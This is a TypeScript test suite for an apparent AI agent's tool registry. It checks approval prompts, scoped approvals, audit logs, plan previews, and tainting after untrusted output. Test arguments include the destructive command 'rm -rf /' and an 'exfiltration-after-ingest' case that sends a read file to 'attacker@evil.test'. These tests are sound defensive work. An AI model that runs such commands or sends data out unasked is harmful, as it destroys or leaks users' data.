import { beforeEach, describe, expect, it } from 'vitest'
import { ToolRegistry } from './tools.js'
import type { ApprovalDecision, ApprovalHandler } from './tools.js'
import type { ToolDefinition } from './types.js'

const echoTool: ToolDefinition<{ text: string }> = {
  name: 'echo',
  description: 'echoes text back',
  schema: { type: 'object', properties: { text: { type: 'string' } } },
  permissionLevel: 'safe',
  async execute(args) {
    return { ok: true, content: args.text }
  },
}

const shellTool: ToolDefinition<{ cmd: string }> = {
  name: 'shell',
  description: 'runs a shell command',
  schema: { type: 'object', properties: { cmd: { type: 'string' } } },
  permissionLevel: 'ask',
  async execute(args) {
    return { ok: true, content: `ran: ${args.cmd}` }
  },
}

const ctx = () => new AbortController().signal

describe('ToolRegistry', () => {
  it('executes a safe tool without approval', async () => {
    const registry = new ToolRegistry()
    registry.register(echoTool)
    const result = await registry.execute(
      { id: '1', name: 'echo', args: { text: 'hi' } },
      { taskId: 't1', signal: ctx() },
    )
    expect(result).toEqual({ ok: true, content: 'hi' })
  })

  it('denies an "ask" tool by default with no approval handler', async () => {
    const registry = new ToolRegistry()
    registry.register(shellTool)
    const result = await registry.execute(
      { id: '2', name: 'shell', args: { cmd: 'ls' } },
      { taskId: 't1', signal: ctx() },
    )
    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/approval/)
  })

  it('runs an "ask" tool once the approval handler allows it', async () => {
    const registry = new ToolRegistry()
    registry.register(shellTool)
    registry.onApproval(() => true)
    const result = await registry.execute(
      { id: '3', name: 'shell', args: { cmd: 'ls' } },
      { taskId: 't1', signal: ctx() },
    )
    expect(result).toEqual({ ok: true, content: 'ran: ls' })
  })

  it('tells the approval handler which task is asking', async () => {
    const registry = new ToolRegistry()
    registry.register(shellTool)
    const asked: string[] = []
    registry.onApproval((_call, _tool, { taskId }) => {
      asked.push(taskId)
      return taskId === 'foreground'
    })

    const foreground = await registry.execute(
      { id: '3a', name: 'shell', args: { cmd: 'ls' } },
      { taskId: 'foreground', signal: ctx() },
    )
    const background = await registry.execute(
      { id: '3b', name: 'shell', args: { cmd: 'ls' } },
      { taskId: 'job_1', signal: ctx() },
    )

    expect(asked).toEqual(['foreground', 'job_1'])
    expect(foreground.ok).toBe(true)
    expect(background.ok).toBe(false)
  })

  it('does not let a remembered approval cover an unattended task', async () => {
    const registry = new ToolRegistry()
    registry.register(shellTool)
    const asked: string[] = []
    registry.onApproval((_call, _tool, { taskId }) => {
      asked.push(taskId)
      return taskId === 'foreground' ? { approved: true, scope: 'session', match: 'tool' } : false
    })
    registry.setUnattended((taskId) => taskId.startsWith('job_'))

    await registry.execute({ id: 'u1', name: 'shell', args: { cmd: 'ls' } }, { taskId: 'foreground', signal: ctx() })
    const background = await registry.execute(
      { id: 'u2', name: 'shell', args: { cmd: 'ls' } },
      { taskId: 'job_1', signal: ctx() },
    )

    expect(background.ok).toBe(false)
    expect(asked).toEqual(['foreground', 'job_1'])
  })

  it('denies a dangerous tool even if approval handler says yes, unless explicitly enabled', async () => {
    const registry = new ToolRegistry()
    registry.register({ ...shellTool, name: 'rm', permissionLevel: 'dangerous' })
    registry.onApproval(() => true)
    const denied = await registry.execute(
      { id: '4', name: 'rm', args: { cmd: 'rm -rf /' } },
      { taskId: 't1', signal: ctx() },
    )
    expect(denied.ok).toBe(false)

    registry.enableDangerous('rm')
    const allowed = await registry.execute(
      { id: '5', name: 'rm', args: { cmd: 'rm -rf /' } },
      { taskId: 't1', signal: ctx() },
    )
    expect(allowed.ok).toBe(true)
  })

  it('records every call in the audit log', async () => {
    const registry = new ToolRegistry()
    registry.register(echoTool)
    await registry.execute({ id: '6', name: 'echo', args: { text: 'x' } }, { taskId: 't1', signal: ctx() })
    expect(registry.auditLog).toHaveLength(1)
    expect(registry.auditLog[0].approved).toBe(true)
  })

  it('returns an error for an unknown tool instead of throwing', async () => {
    const registry = new ToolRegistry()
    const result = await registry.execute({ id: '7', name: 'nope', args: {} }, { taskId: 't1', signal: ctx() })
    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/unknown tool/)
  })
})

describe('scoped approvals', () => {
  const ctx = (taskId = 't1') => ({ taskId, signal: new AbortController().signal })
  const call = (args: Record<string, unknown> = { path: 'a.txt' }) => ({ id: 'c1', name: 'writer', args })

  function setup(handler: ApprovalHandler) {
    const registry = new ToolRegistry()
    let runs = 0
    registry.register({
      name: 'writer',
      description: 'writes',
      schema: {},
      permissionLevel: 'ask',
      async execute() {
        runs += 1
        return { ok: true, content: 'done' }
      },
    })
    registry.onApproval(handler)
    return { registry, prompts: () => prompted, runs: () => runs }
  }

  let prompted = 0
  const counting =
    (decision: boolean | ApprovalDecision): ApprovalHandler =>
    () => {
      prompted += 1
      return decision
    }

  beforeEach(() => {
    prompted = 0
  })

  it('still prompts every time for a plain boolean answer', async () => {
    const { registry, prompts } = setup(counting(true))
    await registry.execute(call(), ctx())
    await registry.execute(call(), ctx())
    expect(prompts()).toBe(2)
  })

  it('asks once for a task-scoped approval and remembers it', async () => {
    const { registry, prompts, runs } = setup(counting({ approved: true, scope: 'task' }))
    await registry.execute(call(), ctx())
    await registry.execute(call(), ctx())
    expect(prompts()).toBe(1)
    expect(runs()).toBe(2)
  })

  it('does not carry a task-scoped approval into another task', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'task' }))
    await registry.execute(call(), ctx('t1'))
    await registry.execute(call(), ctx('t2'))
    expect(prompts()).toBe(2)
  })

  it('forgets a task-scoped approval when the task ends', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'task' }))
    await registry.execute(call(), ctx('t1'))
    registry.endTask('t1')
    await registry.execute(call(), ctx('t1'))
    expect(prompts()).toBe(2)
  })

  it('carries a session-scoped approval across tasks', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'session' }))
    await registry.execute(call(), ctx('t1'))
    await registry.execute(call(), ctx('t2'))
    expect(prompts()).toBe(1)
  })

  it('remembers only the exact arguments by default', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'session' }))
    await registry.execute(call({ path: 'a.txt' }), ctx())
    await registry.execute(call({ path: 'b.txt' }), ctx())
    expect(prompts()).toBe(2)
  })

  it('treats the same arguments in a different key order as the same decision', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'session' }))
    await registry.execute(call({ a: 1, b: 2 }), ctx())
    await registry.execute(call({ b: 2, a: 1 }), ctx())
    expect(prompts()).toBe(1)
  })

  it('covers the whole tool when the decision says so', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'session', match: 'tool' }))
    await registry.execute(call({ path: 'a.txt' }), ctx())
    await registry.execute(call({ path: 'b.txt' }), ctx())
    expect(prompts()).toBe(1)
  })

  it('never remembers a denial', async () => {
    const { registry, prompts, runs } = setup(counting({ approved: false, scope: 'session' }))
    await registry.execute(call(), ctx())
    await registry.execute(call(), ctx())
    expect(prompts()).toBe(2)
    expect(runs()).toBe(0)
  })

  it('distinguishes a remembered approval from one a human just gave', async () => {
    const { registry } = setup(counting({ approved: true, scope: 'session' }))
    await registry.execute(call(), ctx())
    await registry.execute(call(), ctx())
    expect(registry.auditLog.map((entry) => entry.approvalSource)).toEqual(['granted', 'remembered'])
  })

  it('records a safe call as safe rather than approved by anyone', async () => {
    const registry = new ToolRegistry()
    registry.register({
      name: 'reader',
      description: 'reads',
      schema: {},
      permissionLevel: 'safe',
      async execute() {
        return { ok: true, content: 'done' }
      },
    })
    await registry.execute({ id: 'c1', name: 'reader', args: {} }, ctx())
    expect(registry.auditLog[0].approvalSource).toBe('safe')
  })

  it('lists what is remembered and revokes it', async () => {
    const { registry, prompts } = setup(counting({ approved: true, scope: 'session' }))
    await registry.execute(call(), ctx())
    expect(registry.listApprovals()).toEqual([
      { tool: 'writer', match: 'exact', scope: 'session', taskId: undefined, args: { path: 'a.txt' } },
    ])

    registry.revokeApprovals('writer')

    expect(registry.listApprovals()).toEqual([])
    await registry.execute(call(), ctx())
    expect(prompts()).toBe(2)
  })

  it('never remembers a dangerous tool, however the handler answers', async () => {
    const registry = new ToolRegistry()
    registry.register({
      name: 'nuke',
      description: 'dangerous',
      schema: {},
      permissionLevel: 'dangerous',
      async execute() {
        return { ok: true, content: 'done' }
      },
    })
    registry.enableDangerous('nuke')
    registry.onApproval(counting({ approved: true, scope: 'session', match: 'tool' }))

    await registry.execute({ id: 'c1', name: 'nuke', args: {} }, ctx())
    await registry.execute({ id: 'c2', name: 'nuke', args: {} }, ctx())

    expect(prompted).toBe(2)
    expect(registry.listApprovals()).toEqual([])
  })
})

describe('tainted tasks', () => {
  const ctx = (taskId = 't1') => ({ taskId, signal: new AbortController().signal })

  function setup() {
    const registry = new ToolRegistry()
    let prompts = 0
    registry.register({ ...echoTool, name: 'fetch', untrustedOutput: true })
    registry.register(shellTool)
    registry.onApproval(() => {
      prompts++
      return { approved: true, scope: 'session', match: 'tool' }
    })
    return { registry, prompts: () => prompts }
  }

  it('stops honouring remembered approvals in a task that read untrusted output', async () => {
    const { registry, prompts } = setup()
    await registry.execute({ id: '1', name: 'shell', args: { cmd: 'ls' } }, ctx())
    await registry.execute({ id: '2', name: 'shell', args: { cmd: 'ls' } }, ctx())
    expect(prompts()).toBe(1)

    await registry.execute({ id: '3', name: 'fetch', args: { text: 'page' } }, ctx())
    expect(registry.isTainted('t1')).toBe(true)
    await registry.execute({ id: '4', name: 'shell', args: { cmd: 'ls' } }, ctx())
    await registry.execute({ id: '5', name: 'shell', args: { cmd: 'ls' } }, ctx())
    expect(prompts()).toBe(3)
  })

  it('leaves other tasks, and the same task after it ends, as they were', async () => {
    const { registry, prompts } = setup()
    await registry.execute({ id: '1', name: 'shell', args: { cmd: 'ls' } }, ctx('t1'))
    await registry.execute({ id: '2', name: 'fetch', args: { text: 'page' } }, ctx('t1'))

    await registry.execute({ id: '3', name: 'shell', args: { cmd: 'ls' } }, ctx('t2'))
    expect(prompts()).toBe(1)

    registry.endTask('t1')
    expect(registry.isTainted('t1')).toBe(false)
    await registry.execute({ id: '4', name: 'shell', args: { cmd: 'ls' } }, ctx('t1'))
    expect(prompts()).toBe(1)
  })

  it('is not tainted by an untrusted tool that was never allowed to run', async () => {
    const registry = new ToolRegistry()
    registry.register({ ...shellTool, name: 'fetch_ask', untrustedOutput: true })
    await registry.execute({ id: '1', name: 'fetch_ask', args: { cmd: 'x' } }, ctx())
    expect(registry.isTainted('t1')).toBe(false)
  })
})

describe('sequence-level scrutiny', () => {
  /** A tool that reads something back, standing in for a file or an inbox. */
  const readTool: ToolDefinition<{ path: string }> = {
    name: 'read_file',
    description: 'reads a file',
    schema: { type: 'object', properties: { path: { type: 'string' } } },
    permissionLevel: 'safe',
    async execute() {
      return { ok: true, content: 'the contents of the invoice' }
    },
  }

  /** A `safe` tool that addresses somewhere, standing in for an MCP send. */
  const sendTool: ToolDefinition<{ to: string }> = {
    name: 'send',
    description: 'sends the message somewhere',
    schema: { type: 'object', properties: { to: { type: 'string' } } },
    permissionLevel: 'safe',
    async execute(args) {
      return { ok: true, content: `sent to ${args.to}` }
    },
  }

  const read = { id: 'r', name: 'read_file', args: { path: 'invoice.pdf' } }
  const send = { id: 's', name: 'send', args: { to: 'attacker@evil.test' } }

  function registryWith(handler: ApprovalHandler): ToolRegistry {
    const registry = new ToolRegistry()
    registry.register(readTool)
    registry.register(sendTool)
    registry.onApproval(handler)
    return registry
  }

  it('asks about a safe call that sends somewhere new after the task read something', async () => {
    const asked: string[] = []
    const registry = registryWith((_call, _tool, context) => {
      asked.push(context.escalation?.rule ?? 'none')
      return false
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toEqual(['exfiltration-after-ingest'])
    expect(result.ok).toBe(false)
    expect(result.error).toContain('evil.test')
  })

  it('lets the same call through untouched when the task has read nothing yet', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return false
    })

    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(0)
    expect(result).toEqual({ ok: true, content: 'sent to attacker@evil.test' })
  })

  it('does not ask about a destination the user named themselves', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return false
    })
    registry.noteUserRequest('t1', 'read invoice.pdf and mail it to attacker@evil.test')

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    const result = await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(0)
    expect(result.ok).toBe(true)
  })

  it('asks again for the same destination rather than spending a remembered approval', async () => {
    let asked = 0
    const registry = registryWith((): ApprovalDecision => {
      asked++
      return { approved: true, scope: 'session', match: 'tool' }
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })
    await registry.execute({ ...send, args: { to: 'attacker@other-evil.test' } }, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(2)
    expect(registry.listApprovals()).toEqual([])
  })

  it('stops asking about a destination the task has already reached', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return true
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(1)
  })

  it('does not let a refused destination become a settled one', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return false
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(2)
  })

  it('records the rule that flagged a call in the audit log', async () => {
    const registry = registryWith(() => false)
    await registry.execute(read, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(registry.auditLog.at(-1)?.escalation?.rule).toBe('exfiltration-after-ingest')
    expect(registry.auditLog.at(-1)?.permissionLevel).toBe('safe')
  })

  it('forgets what a task read once its turn ends', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return false
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    registry.endTask('t1')
    await registry.execute(send, { taskId: 't1', signal: ctx() })

    expect(asked).toBe(0)
  })

  describe('replayed from the session log', () => {
    const ingestEvents = (ok = true) => [
      { type: 'tool/call' as const, taskId: 't1', at: 0, call: read },
      {
        type: 'tool/result' as const,
        taskId: 't1',
        at: 1,
        callId: 'r',
        result: { ok, content: ok ? 'the contents' : '', error: ok ? undefined : 'nope' },
      },
    ]

    it('still flags a send in a later turn, so ending a turn is no escape', async () => {
      let asked = 0
      const registry = registryWith((_c, _t, context) => {
        if (context.escalation) asked++
        return false
      })

      // Turn one read the file; endTask dropped the live state.
      registry.endTask('t1')
      registry.replayTask('t1', ingestEvents())
      await registry.execute(send, { taskId: 't1', signal: ctx() })

      expect(asked).toBe(1)
    })

    it('does not re-prompt for a destination an earlier turn reached successfully', async () => {
      let asked = 0
      const registry = registryWith(() => {
        asked++
        return false
      })

      registry.replayTask('t1', [
        ...ingestEvents(),
        { type: 'tool/call', taskId: 't1', at: 2, call: send },
        { type: 'tool/result', taskId: 't1', at: 3, callId: 's', result: { ok: true, content: 'sent' } },
      ])
      await registry.execute(send, { taskId: 't1', signal: ctx() })

      expect(asked).toBe(0)
    })

    it('does not wave through a destination an earlier turn was refused', async () => {
      let asked = 0
      const registry = registryWith((_c, _t, context) => {
        if (context.escalation) asked++
        return false
      })

      registry.replayTask('t1', [
        ...ingestEvents(),
        { type: 'tool/call', taskId: 't1', at: 2, call: send },
        // What a refusal looks like in the log: the call is there, the result is not ok.
        { type: 'tool/result', taskId: 't1', at: 3, callId: 's', result: { ok: false, content: '', error: 'denied' } },
      ])
      await registry.execute(send, { taskId: 't1', signal: ctx() })

      expect(asked).toBe(1)
    })

    it('counts an error body as something read, since it carries the far side’s text', async () => {
      let asked = 0
      const registry = registryWith((_c, _t, context) => {
        if (context.escalation) asked++
        return false
      })

      registry.replayTask('t1', ingestEvents(false))
      await registry.execute(send, { taskId: 't1', signal: ctx() })

      expect(asked).toBe(1)
    })
  })

  it('keeps what one task read out of another task’s judgement', async () => {
    let asked = 0
    const registry = registryWith(() => {
      asked++
      return false
    })

    await registry.execute(read, { taskId: 't1', signal: ctx() })
    await registry.execute(send, { taskId: 't2', signal: ctx() })

    expect(asked).toBe(0)
  })
})

describe('plan mode', () => {
  const ctx = (taskId = 't1') => ({ taskId, signal: new AbortController().signal })
  const call = (args: Record<string, unknown> = { path: 'a.txt', content: 'new' }) => ({
    id: 'c1',
    name: 'writer',
    args,
  })

  function writeTool(overrides: Partial<ToolDefinition> = {}) {
    let runs = 0
    const tool: ToolDefinition = {
      name: 'writer',
      description: 'writes a file',
      schema: {},
      permissionLevel: 'ask',
      async execute() {
        runs += 1
        return { ok: true, content: 'written' }
      },
      async plan(args) {
        return { ok: true, content: `planned diff for ${String(args.path)}` }
      },
      ...overrides,
    }
    return { tool, runs: () => runs }
  }

  const approve = () => {
    const seen: string[] = []
    const handler: ApprovalHandler = (_call, _tool, approvalCtx) => {
      seen.push(approvalCtx?.planPreview ?? '')
      return true
    }
    return { handler, seen }
  }

  it('leaves plan hooks inert unless plan mode is enabled', async () => {
    let planned = 0
    const { tool } = writeTool({
      plan: async () => {
        planned += 1
        return { ok: true, content: 'x' }
      },
    })
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(() => true)

    const result = await registry.execute(call(), ctx())

    expect(result).toEqual({ ok: true, content: 'written' })
    expect(planned).toBe(0)
  })

  it('shows the plan preview to the approval handler when enabled', async () => {
    const { tool } = writeTool()
    const { handler, seen } = approve()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(handler)
    registry.enablePlans()

    const result = await registry.execute(call(), ctx())

    expect(result.ok).toBe(true)
    expect(seen).toEqual(['planned diff for a.txt'])
  })

  it('records the plan preview in the audit log', async () => {
    const { tool } = writeTool()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(() => true)
    registry.enablePlans()

    await registry.execute(call(), ctx())

    expect(registry.auditLog).toHaveLength(1)
    expect(registry.auditLog[0].planPreview).toBe('planned diff for a.txt')
  })

  it('without plan mode an approved ask call carries no preview', async () => {
    const { tool } = writeTool()
    const { handler, seen } = approve()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(handler)

    await registry.execute(call(), ctx())

    expect(seen).toEqual([''])
  })

  it('denies the call without executing when the reviewed change is rejected', async () => {
    const { tool, runs } = writeTool()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(() => false)
    registry.enablePlans()

    const result = await registry.execute(call(), ctx())

    expect(result.ok).toBe(false)
    expect(result.error).toMatch(/requires approval/)
    expect(runs()).toBe(0)
    expect(registry.auditLog[0]).toMatchObject({ approved: false, approvalSource: 'denied' })
  })

  it('denies without prompting when the preview itself fails', async () => {
    let prompted = 0
    const { tool } = writeTool({
      plan: async () => ({ ok: false, content: '', error: '"x.txt" is not a regular file' }),
    })
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(() => {
      prompted += 1
      return true
    })
    registry.enablePlans()

    const result = await registry.execute(call({ path: 'x.txt' }), ctx())

    expect(prompted).toBe(0)
    expect(result.ok).toBe(false)
    expect(result.error).toBe('"x.txt" is not a regular file')
  })

  it('puts a safe tool with a plan hook under review in plan mode', async () => {
    const { tool } = writeTool({ permissionLevel: 'safe' })
    const { handler, seen } = approve()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(handler)
    registry.enablePlans()

    const result = await registry.execute(call(), ctx())

    expect(result.ok).toBe(true)
    expect(seen).toEqual(['planned diff for a.txt'])
    expect(registry.auditLog[0].approvalSource).toBe('granted')
  })

  it('still auto-runs a safe tool without a plan hook in plan mode', async () => {
    let prompted = 0
    const registry = new ToolRegistry()
    registry.register({ ...echoTool, permissionLevel: 'safe' })
    registry.onApproval(() => {
      prompted += 1
      return true
    })
    registry.enablePlans()

    const result = await registry.execute({ id: '1', name: 'echo', args: { text: 'hi' } }, ctx())

    expect(prompted).toBe(0)
    expect(result).toEqual({ ok: true, content: 'hi' })
  })

  it('remembers an approved task-scoped change and skips a repeat review', async () => {
    const { tool, runs } = writeTool()
    const registry = new ToolRegistry()
    registry.register(tool)
    registry.onApproval(() => ({ approved: true, scope: 'task' }))
    registry.enablePlans()

    await registry.execute(call(), ctx())
    await registry.execute(call(), ctx())

    expect(runs()).toBe(2)
    expect(registry.listApprovals()).toHaveLength(1)
  })
})
